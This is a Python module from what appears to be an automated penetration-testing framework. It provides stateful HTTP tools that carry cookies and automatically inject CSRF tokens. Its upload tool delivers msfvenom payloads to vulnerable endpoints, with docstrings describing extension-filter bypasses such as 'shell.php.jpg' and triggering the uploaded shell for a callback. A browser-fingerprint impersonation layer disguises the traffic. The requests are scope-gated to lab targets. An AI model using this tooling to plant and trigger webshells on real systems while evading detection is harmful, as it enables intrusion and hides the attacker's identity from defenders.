"""Stateful HTTP lane — the tools that CARRY the universal cookie jar.

The framework's one-shot web tools (web_probe, cors_probe, ssrf_probe)
answer "what does this surface look like".  They can't WALK it: every
call starts cookieless, so CSRF-guarded middleware (Django's
``csrfmiddlewaretoken`` + ``csrftoken`` cookie being the canonical case on
192.168.56.106) rejects everything at the front door.  This module is
the stateful counterpart, built on the universal jar + token vault
(``utils/cookie_jar.py`` — SQLite, shared across every lane/process):

- ``session_get``  — GET with jar state applied, Set-Cookie persisted,
  CSRF tokens auto-extracted (form hidden fields, meta tags, response
  headers) into the vault.
- ``session_post`` — POST with the SAME state plus auto-CSRF injection:
  the stored form token (``csrfmiddlewaretoken`` / ``authenticity_token``
  / ``_token`` ...) goes into the body, an ``X-CSRFToken`` header goes out
  (cookie-derived for Django, meta-derived otherwise).
- ``session_request`` — arbitrary-method jar-aware request for the odd
  shapes (PUT/DELETE/HEAD, JSON APIs) — cookies applied + persisted, no
  auto-CSRF.
- ``session_upload`` — multipart file upload (the msfvenom lane's delivery
  step: file upload vulnerability testing).  Reads a local artifact (e.g.
  the ``out_path`` from ``payloads/msfvenom_tools.generate_payload``),
  sends it as ``multipart/form-data`` with jar cookies + auto-CSRF form
  field, and lets the caller override the multipart filename/content-type
  (extension-filter bypasses are server-side filename games — the local
  file never needs renaming).  Every hop gated like the rest of the lane.

The canonical Django flow these enable::

    session_get  http://target/login/          -> jar: csrftoken cookie
                                                   vault: csrfmiddlewaretoken
    session_post http://target/login/  data="user=..&pass=.."
                                        -> jar: sessionid, 302 followed
    session_get  http://target/admin/           -> 200, authenticated

Every hop of every request is scope-gate validated via
``utils.gated_http.gated_request`` (per-hop ``check_scan`` — a 302 to an
out-of-scope host raises ``ScopeGateError`` before any traffic fires),
identically to the rest of the framework's HTTP lane.  The jar itself only
stores strings; these tools are the only place it becomes traffic, and the
gate sits in front of every packet.

IDENTITY (evasion/webshape): every hop ships one coherent fingerprint —
UA claim, TLS stack, header set and header ORDER resolved together by
``sticky_profile``. When curl_cffi (curl-impersonate) is installed and
policy allows, the request travels on the impersonating client whose TLS
ClientHello + template headers match the sticky UA claim; otherwise the
call degrades honestly to the plain python-requests path (same UA claim,
canonicalised family header order + decodable-only Accept-Encoding fill)
and the envelope's ``fingerprint`` field says which backend shipped it.
``SESSION_IMPERSONATION=off`` disables the impersonated lane; a caller-
supplied or SESSION_UA identity is operator-owned and never impersonated.

Blocking by design (sync ``requests`` through the gated hop loop); the
Brain dispatchers run sync tools in worker threads, per the framework's
blocking-calls convention.
"""

from __future__ import annotations

import os
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse

import requests

from constants import framework_tool
from utils.cookie_jar import extract_csrf_tokens, get_jar
from utils.gated_http import gated_request
from utils.scope_gate import ScopeGateError
from evasion.webshape import (
    HostFloor,
    canonical_fill_for_family,
    impersonation_mode,
    impersonation_target,
    order_headers_for_family,
    sticky_profile,
)

# UA/pacing moved to evasion/webshape (sticky_ua is per-host deterministic;
# the old self-identifying marker remains reachable via SESSION_UA=legacy).
_TOKEN_SCAN_LIMIT = 262144  # extract tokens from at most this much body


def _merge_headers(
    base: Optional[Dict[str, str]],
    extra: Optional[Dict[str, str]],
    host: str = "",
) -> Dict[str, str]:
    """Sticky UA + caller headers, emitted in the identity family's
    canonical browser order (evasion/webshape profiles own the order)."""
    profile = sticky_profile(host)
    merged: Dict[str, str] = {"User-Agent": profile["ua"]}
    if base:
        merged.update({str(k): str(v) for k, v in base.items()})
    if extra:
        merged.update({str(k): str(v) for k, v in extra.items()})
    return order_headers_for_family(merged, profile["family"])


def _build_session(
    profile: Dict[str, Any],
    method: str,
    caller_ua_override: bool = False,
    files_present: bool = False,
) -> Tuple[Any, Dict[str, Any]]:
    """Transport chooser for one identity, resolved ONCE per call.

    Returns ``(session, fingerprint)``.  The impersonated path is the
    curl-impersonate client on the profile's pinned target — TLS stack and
    template header set/order match the sticky UA claim by construction
    (pool strings carry the template's platform-variant overrides when the
    template ships another platform's UA).  The degraded path is the plain
    python-requests session: same UA claim, canonicalised header order +
    decodable-only Accept*/Accept-Language fill, and the envelope says so.

    Never impersonates when identity is operator-owned (``SESSION_UA``
    override or a caller-supplied ``User-Agent`` — the TLS stack cannot be
    reshaped to match an arbitrary claimed agent) or in the multipart
    upload lane (curl_cffi's ``files``-shaped API is not wired; honest
    fallback, envelope note).
    """
    fingerprint: Dict[str, Any] = {
        "mode": impersonation_mode(),
        "impersonated": False,
        "backend": "python-requests",
        "target": None,
        "reason": None,
    }

    def _off(reason: str) -> Tuple[Any, Dict[str, Any]]:
        fingerprint["reason"] = reason
        return requests.Session(), fingerprint

    if fingerprint["mode"] == "off":
        return _off("SESSION_IMPERSONATION=off")
    if not profile.get("target") or caller_ua_override:
        return _off("operator-owned UA identity (SESSION_UA/caller override)")
    target = impersonation_target(profile)
    if target is None:
        return _off("curl_cffi missing or pinned target no longer installed")
    if files_present:
        return _off("multipart upload lane (curl_cffi files API not wired)")

    from curl_cffi import requests as _curl_requests

    session = _curl_requests.Session(impersonate=target)
    fingerprint.update(
        impersonated=True, backend="curl-impersonate", target=target
    )
    return session, fingerprint


def _host_of(url: str) -> str:
    try:
        return (urlparse(url).hostname or "").lower()
    except ValueError:
        return ""


def _form_encode(data: Any) -> Tuple[str, Dict[str, str]]:
    """Normalise a ``data`` argument to ``(form_string, original_dict)``.

    Dict -> urlencoded string (kept separately for name lookups);
    string -> used verbatim (parsed for name lookups); anything else
    (requests' odd forms) -> (None, {}).
    """
    if data is None:
        return "", {}
    if isinstance(data, dict):
        return urlencode(data, doseq=True), {str(k): str(v) for k, v in data.items()}
    if isinstance(data, str):
        try:
            return data, dict(parse_qsl(data, keep_blank_values=True))
        except Exception:  # noqa: BLE001 - unparseable body: send verbatim
            return data, {}
    return "", {}


def _csrf_inject(
    host: str, data: Any, json_data: Any, headers: Dict[str, str]
) -> Optional[Dict[str, Any]]:
    """Best-effort CSRF injection for a POST. Returns what was injected."""
    jar = get_jar()
    csrf = jar.csrf_for(host)
    injected: Dict[str, Any] = {"form_field": None, "header": None}
    if csrf.get("header_value"):
        headers.setdefault("X-CSRFToken", csrf["header_value"])
        headers.setdefault("X-CSRF-TOKEN", csrf["header_value"])
        injected["header"] = csrf["header_value"]
    if csrf.get("form_name") and csrf.get("form_value") and not json_data:
        name, value = csrf["form_name"], csrf["form_value"]
        if isinstance(data, dict):
            if name not in data:
                data = dict(data)
                data[name] = value
                injected["form_field"] = (name, value, "dict")
        elif isinstance(data, str):
            existing = dict(parse_qsl(data, keep_blank_values=True))
            if name not in existing:
                sep = "" if not data else ("&" if not data.endswith("&") else "")
                data = f"{data}{sep}{urlencode({name: value})}"
                injected["form_field"] = (name, value, "str")
        elif data is None:
            data = urlencode({name: value})
            injected["form_field"] = (name, value, "synthesized")
    injected["data"] = data if injected.get("form_field") else None
    return injected if (injected["form_field"] or injected["header"]) else None


def _title_of(text: str) -> Optional[str]:
    import re

    m = re.search(r"<title[^>]*>(.*?)</title>", text or "", re.IGNORECASE | re.DOTALL)
    if not m:
        return None
    return re.sub(r"\s+", " ", m.group(1)).strip()[:200] or None


def _do_session_request(
    method: str,
    url: str,
    *,
    data: Any = None,
    json_data: Any = None,
    headers: Optional[Dict[str, str]] = None,
    insecure: bool = False,
    timeout: float = 15.0,
    max_hops: int = 5,
    follow_redirects: bool = True,
    body_limit: int = 4096,
    extract_tokens: bool = True,
    csrf: bool = False,
    files: Any = None,
) -> Dict[str, Any]:
    """Shared engine: jar-apply -> gated request -> jar-persist -> envelope."""
    jar = get_jar()
    host = _host_of(url)
    if not host:
        raise ScopeGateError(f"scope gate: cannot parse host from URL {url!r}")

    floor_waited = HostFloor.wait(host)

    profile = sticky_profile(host)
    merged = _merge_headers(headers, None, host=host)
    caller_ua_override = bool(headers and any(
        str(k).lower() == "user-agent" for k in headers
    ))
    session, fingerprint = _build_session(
        profile, method,
        caller_ua_override=caller_ua_override,
        files_present=files is not None,
    )

    if fingerprint["impersonated"]:
        # curl-impersonate path: the TEMPLATE owns the browser header set
        # (UA, client hints, sec-fetch set, Accept*, ordering) — only
        # app-level headers travel, plus the profile's coherent platform
        # overrides baked into the template's positions.  Jar cookies ride
        # as a ready-made Cookie header (the jar's RFC 6265 matcher), not
        # through requests' cookie-store API.
        applied: List[str] = []
        cookie_hdr = jar.cookie_header(url)
        if cookie_hdr:
            merged["Cookie"] = cookie_hdr
            merged = order_headers_for_family(merged, profile["family"])
            applied = [c.name for c in jar.cookies_for(url)]
        wire_headers = {
            k: v for k, v in merged.items() if str(k).lower() != "user-agent"
        }
        for name, value in profile.get("apply", []):
            wire_headers[name] = value  # coherent template overrides
        wire_headers = order_headers_for_family(wire_headers, profile["family"])
    else:
        # plain requests path: our ordered header dict is the WHOLE story —
        # kill requests' default headers so nothing unclaimed sneaks onto
        # the wire out of canonical order, then fill the browser trio the
        # caller didn't supply (identity-consistent, decodable-only).
        session.headers.clear()
        applied = jar.apply_to_session(session, url)
        fill = canonical_fill_for_family(profile, method, merged)
        merged = order_headers_for_family({**fill, **merged}, profile["family"])
        wire_headers = merged

    injected = None
    if csrf and (method or "").upper() == "POST":
        injected = _csrf_inject(host, data, json_data, wire_headers)
        if injected and injected.get("data") is not None:
            data = injected["data"]  # body gained the CSRF form field

    resp, hops = gated_request(
        method,
        url,
        headers=wire_headers,
        data=data,
        json=json_data,
        files=files,
        verify=not insecure,
        timeout=(5.0, timeout),
        max_hops=max_hops,
        allow_redirects=follow_redirects,
        session=session,
    )

    final_url = hops[-1]["url"] if hops else url
    if fingerprint["impersonated"]:
        # curl_cffi's Cookies object wraps a stdlib CookieJar — persist from
        # that inner jar; same http.cookiejar.Cookie attrs as requests.
        received = jar.store_response_cookies(session.cookies.jar, origin=final_url)
    else:
        received = jar.store_response_cookies(session.cookies, origin=final_url)
    session.close()

    text = ""
    ctype = resp.headers.get("Content-Type", "")
    if "text" in ctype or "html" in ctype or "json" in ctype or "xml" in ctype or not ctype:
        try:
            text = resp.text[: _TOKEN_SCAN_LIMIT]
        except Exception:  # noqa: BLE001 - decode issues shouldn't kill the call
            text = ""
    tokens_extracted: List[Dict[str, str]] = []
    if extract_tokens:
        for t in extract_csrf_tokens(text, dict(resp.headers)):
            jar.store_token(
                host, t["name"], t["value"],
                token_type="csrf", origin=final_url, context=t["source"],
            )
            tokens_extracted.append(t)

    domain_state = jar.list_state(host)
    envelope: Dict[str, Any] = {
        "status": "Success",
        "method": (method or "GET").upper(),
        "url": url,
        "final_url": final_url,
        "http_status": resp.status_code,
        "reason": resp.reason,
        "hops": hops,
        "cookies_applied": applied,
        "cookies_received": [c for c in received if c.get("changed")],
        "cookies_now": [c["name"] for c in domain_state["cookies"]],
        "csrf_injected": (
            {
                "form_field": injected["form_field"][0] if injected and injected.get("form_field") else None,
                "header": bool(injected and injected.get("header")),
            }
            if csrf
            else None
        ),
        "tokens_extracted": tokens_extracted,
        "content_type": ctype,
        "title": _title_of(text),
        "body_length": len(resp.content or b""),
        "body_head": text[: max(0, int(body_limit))],
        "ua_applied": merged.get("User-Agent", "") or profile["ua"],
        "fingerprint": fingerprint,
        "floor_waited": floor_waited,
    }
    if files:
        # Multipart part names (dict or tuple-shaped files mapping).
        try:
            part_fields = list(files.keys())
        except AttributeError:
            part_fields = ["<unnamed>"]
        envelope["upload"] = {
            "multipart": True,
            "file_fields": part_fields,
            "form_fields": (
                sorted(str(k) for k in data.keys()) if isinstance(data, dict) else []
            ),
        }
    return envelope


def _session_digest(result: Dict[str, Any]) -> Dict[str, str]:
    """Result-projection digest: state transitions, not page bodies."""
    if result.get("status") != "Success":
        return {"summary": f"failed: {result.get('error', 'unknown')}", "row_hint_format": ""}
    parts = [
        f"{result.get('method')} {result.get('final_url')} -> {result.get('http_status')}"
    ]
    if result.get("cookies_received"):
        names = ", ".join(c["name"] for c in result["cookies_received"])
        parts.append(f"new/updated cookies: {names}")
    if result.get("cookies_applied"):
        parts.append(f"sent: {', '.join(result['cookies_applied'])}")
    csrf_bit = result.get("csrf_injected") or {}
    if csrf_bit.get("form_field"):
        parts.append(f"csrf injected: {csrf_bit['form_field']}")
    if result.get("tokens_extracted"):
        parts.append(
            "tokens: " + ", ".join(t["name"] for t in result["tokens_extracted"])
        )
    if result.get("title"):
        parts.append(f"title: {result['title']}")
    if result.get("ua_applied"):
        parts.append(f"ua: {result['ua_applied'][:48]}")
    fp = result.get("fingerprint") or {}
    if fp.get("impersonated"):
        parts.append(f"fp: {fp.get('target')}")
    elif fp.get("reason"):
        parts.append(f"fp: degraded ({fp['reason']})")
    if result.get("floor_waited"):
        parts.append(f"floor waited {result['floor_waited']:.1f}s")
    if result.get("upload"):
        up = result["upload"]
        parts.append(
            f"uploaded via {', '.join(up.get('file_fields', []))}"
            + (f" (+form: {', '.join(up['form_fields'])})" if up.get("form_fields") else "")
        )
    summary = " | ".join(parts)
    hint = (
        "full response incl. body_head is in scratch; filter it with "
        "scratch_search, or call jar_state for the stored cookie/token values"
    )
    return {"summary": summary, "row_hint_format": hint}


@framework_tool(
    "Stateful HTTP GET: fetch a URL with the universal cookie jar applied "
    "(session cookies, CSRF cookies) and persist every Set-Cookie back into "
    "it, auto-extracting CSRF tokens (Django csrfmiddlewaretoken, Rails "
    "authenticity_token, meta csrf-token, X-CSRFToken headers) into the "
    "token vault. This is step one of walking any stateful/CSRF-protected "
    "web app (Django admin, login flows) — the state lives in the jar and "
    "every later session_get/session_post carries it. Per-hop scope-gated "
    "like all framework HTTP. Follow with session_post on the login form.",
    next_hints=[
        "session_post on the login form action URL",
        "jar_state to inspect collected cookies/tokens",
        "report_finding",
    ],
    result_digest=_session_digest,
    untrusted_target=True,
)
def session_get(
    url: str,
    insecure: bool = False,
    timeout: float = 12.0,
    body_limit: int = 4096,
    follow_redirects: bool = True,
    headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """GET ``url`` carrying jar state; persist cookies; extract CSRF tokens.

    Args:
        url: Absolute URL (``http://192.168.56.106/login/``).  Every
            redirect hop is scope-gate validated.
        insecure: Skip TLS verification (self-signed lab certs).
        timeout: Per-request read timeout, seconds.
        body_limit: Characters of body to return as ``body_head`` (full
            body stays bounded by this; token extraction scans deeper
            internally).
        follow_redirects: Follow 3xx hops (default) or return the 3xx.
        headers: Extra request headers (dict). A realistic, sticky per-host
            User-Agent is applied automatically (evasion/webshape.sticky_ua); pass
            headers={'User-Agent': ...} to override; SESSION_UA env forces a fixed
            identity (RoE-mandated self-identification).
    """
    return _do_session_request(
        "GET", url,
        insecure=insecure, timeout=timeout, body_limit=body_limit,
        follow_redirects=follow_redirects, headers=headers,
        extract_tokens=True,
    )


@framework_tool(
    "Stateful HTTP POST with automatic CSRF handling — the Django (and "
    "Rails/Laravel/ASP.NET) login-flow workhorse. Sends cookies from the "
    "universal jar AND injects the stored CSRF token: the form field "
    "(csrfmiddlewaretoken/authenticity_token/...) into the POST body, plus "
    "an X-CSRFToken header matching the csrftoken cookie. Set-Cookie "
    "responses (sessionid!) persist to the jar, so the flow "
    "session_get login page -> session_post credentials -> session_get "
    "authenticated page just works. Body may be a form string or dict; "
    "json_data for JSON endpoints (CSRF header still injected). Per-hop "
    "scope-gated.",
    next_hints=[
        "session_get the post-login page to confirm authenticated state",
        "jar_state to see the session cookies",
        "report_finding",
    ],
    result_digest=_session_digest,
    untrusted_target=True,
)
def session_post(
    url: str,
    data: Any = None,
    json_data: Any = None,
    auto_csrf: bool = True,
    insecure: bool = False,
    timeout: float = 15.0,
    body_limit: int = 4096,
    follow_redirects: bool = True,
    headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """POST ``url`` with jar state + auto-injected CSRF token.

    Args:
        url: Absolute POST target (the form's action URL).
        data: Form body — a dict (``{"username": "admin", "password": "x"}``)
            or an urlencoded string (``"username=admin&password=x"``).  The
            stored CSRF form field is appended automatically unless the
            name is already present.
        json_data: JSON body for API endpoints (``data`` must be None);
            CSRF goes out as a header, not a form field.
        auto_csrf: Inject the stored CSRF token (default true). Turn off
            for endpoints with no CSRF middleware.
        insecure: Skip TLS verification.
        timeout: Per-request read timeout, seconds.
        body_limit: Characters of body returned as ``body_head``.
        follow_redirects: Follow the post-login 302 (default) — set False
            to inspect the raw 3xx.
        headers: Extra request headers (dict). A realistic, sticky per-host
            User-Agent is applied automatically (evasion/webshape.sticky_ua); pass
            headers={'User-Agent': ...} to override; SESSION_UA env forces a fixed
            identity (RoE-mandated self-identification).
    """
    return _do_session_request(
        "POST", url,
        data=data, json_data=json_data,
        insecure=insecure, timeout=timeout, body_limit=body_limit,
        follow_redirects=follow_redirects, headers=headers,
        extract_tokens=True, csrf=auto_csrf,
    )


@framework_tool(
    "Stateful HTTP request with an arbitrary method (PUT/DELETE/PATCH/HEAD/"
    "OPTIONS): cookies from the universal jar are applied and every "
    "Set-Cookie is persisted, but no automatic CSRF injection — for API "
    "endpoints, state-changing verbs, and odd shapes the session_get/"
    "session_post pair doesn't cover. Auth headers go in ``headers`` "
    "(e.g. Authorization: Bearer ... — store the token with jar_store_token "
    "to keep it in the vault). Per-hop scope-gated like all framework HTTP.",
    next_hints=["session_get", "jar_state", "report_finding"],
    result_digest=_session_digest,
    untrusted_target=True,
)
def session_request(
    method: str,
    url: str,
    data: Any = None,
    json_data: Any = None,
    insecure: bool = False,
    timeout: float = 15.0,
    body_limit: int = 4096,
    follow_redirects: bool = True,
    headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """Jar-aware request with any HTTP method.

    Args:
        method: HTTP verb (``PUT``, ``DELETE``, ``PATCH``, ``HEAD``, ...).
        url: Absolute URL; every redirect hop is scope-gate validated.
        data: Form body (dict or urlencoded string).
        json_data: JSON body (``data`` must be None).
        insecure: Skip TLS verification.
        timeout: Per-request read timeout, seconds.
        body_limit: Characters of body returned as ``body_head``.
        follow_redirects: Follow 3xx hops (default true).
        headers: Extra request headers (dict) — e.g. Authorization bearer.
    """
    return _do_session_request(
        method, url,
        data=data, json_data=json_data,
        insecure=insecure, timeout=timeout, body_limit=body_limit,
        follow_redirects=follow_redirects, headers=headers,
        extract_tokens=True,
    )


UPLOAD_MAX_BYTES = int(os.getenv("SESSION_UPLOAD_MAX_MB", "64")) * 1024 * 1024


@framework_tool(
    "Multipart file upload through a vulnerable upload endpoint — the "
    "delivery step of the file-upload vulnerability testing lane. Reads a "
    "local artifact (e.g. the out_path returned by payloads."
    "msfvenom_tools.generate_payload) and POSTs it as multipart/form-data "
    "with universal-jar cookies applied AND the stored CSRF token injected "
    "as a form field — so the upload works through the same authenticated, "
    "CSRF-guarded session that session_get/session_post walked. The "
    "multipart FILENAME can be overridden independently of the local file "
    "(extension-filter bypasses are server-side filename games: pass "
    "file_name='shell.php.jpg' while the local artifact keeps its real "
    "name). After a successful upload, session_get the uploaded file's URL "
    "to trigger the payload; the handler started by "
    "generate_payload(start_handler=True) catches the callback. Per-hop "
    "scope-gated like all framework HTTP.",
    next_hints=[
        "session_get the uploaded file's URL to trigger the uploaded shell",
        "generate_payload in payloads/msfvenom_tools.py for the artifact",
        "report_finding for a confirmed upload vulnerability",
    ],
    tags=["exploit.web", "web.auth"],
    result_digest=_session_digest,
    untrusted_target=True,
)
def session_upload(
    url: str,
    file_path: str,
    file_field: str = "file",
    file_name: Optional[str] = None,
    content_type: Optional[str] = None,
    data: Optional[Dict[str, Any]] = None,
    auto_csrf: bool = True,
    insecure: bool = False,
    timeout: float = 30.0,
    body_limit: int = 4096,
    follow_redirects: bool = True,
    headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """POST ``url`` carrying jar state; persist cookies; extract CSRF tokens.

    Args:
        url: Absolute upload endpoint (the form's action URL). Every
            redirect hop is scope-gate validated.
        file_path: Local artifact path — use the out_path returned by
            generate_payload.
        file_field: Form field name for the file part (inspect the form's
            <input type='file' name=...>; 'file' is the common default).
        file_name: Filename sent in the multipart part (defaults to the
            local file's basename). Override for extension/filter games —
            the server sees THIS name, not the local one.
        content_type: Part Content-Type override (default: sniffed from the
            filename, octet-stream fallback — most upload validators only
            check the extension).
        data: Extra multipart form fields (dict), e.g. the form's hidden
            inputs; the CSRF form field is appended automatically.
        auto_csrf: Inject the stored CSRF token as a form field (default
            true). Turn off for endpoints with no CSRF middleware.
        insecure: Skip TLS verification.
        timeout: Per-request read timeout, seconds (uploads of large
            artifacts take longer than a form post — 30s default).
        body_limit: Characters of body to return as ``body_head``.
        follow_redirects: Follow the post-upload 3xx (default) or inspect
            the raw redirect.
        headers: Extra request headers (dict). A realistic, sticky per-host
            User-Agent is applied automatically (evasion/webshape.sticky_ua); pass
            headers={'User-Agent': ...} to override; SESSION_UA env forces a fixed
            identity (RoE-mandated self-identification).
    """
    import hashlib
    import mimetypes
    from pathlib import Path

    src = Path(file_path).expanduser()
    if not src.is_file():
        # ValueError (not ScopeGateError): local-input problem, not a scope
        # decision — keep the gate exception unambiguous for the operator.
        raise ValueError(
            f"upload source not found: {file_path!r} — generate it with "
            "payloads/msfvenom_tools.generate_payload (or list_dropbox to see "
            "existing artifacts)."
        )
    size = src.stat().st_size
    if size > UPLOAD_MAX_BYTES:
        raise ValueError(
            f"upload source is {size} bytes (cap {UPLOAD_MAX_BYTES}); raise "
            "SESSION_UPLOAD_MAX_MB in the root .env if this is deliberate."
        )
    blob = src.read_bytes()

    part_name = file_name or src.name
    ctype = content_type or mimetypes.guess_type(part_name)[0] or "application/octet-stream"
    files = {file_field: (part_name, blob, ctype)}

    form: Dict[str, Any] = dict(data) if isinstance(data, dict) else (data or {})
    if not isinstance(form, dict):
        # Odd shapes (string body) can't merge with multipart parts — the
        # CSRF field would land as a raw body string and break the encoding.
        raise ValueError(
            "session_upload data must be a dict of form fields (multipart); "
            f"got {type(data).__name__}."
        )

    envelope = _do_session_request(
        "POST", url,
        data=form,
        insecure=insecure, timeout=timeout, body_limit=body_limit,
        follow_redirects=follow_redirects, headers=headers,
        extract_tokens=True, csrf=auto_csrf,
        files=files,
    )
    envelope["uploaded_file"] = {
        "local_path": str(src),
        "size_bytes": size,
        "sha256": hashlib.sha256(blob).hexdigest(),
        "part_name": part_name,
        "part_content_type": ctype,
        "file_field": file_field,
    }
    return envelope


__all__ = ["session_get", "session_post", "session_request", "session_upload"]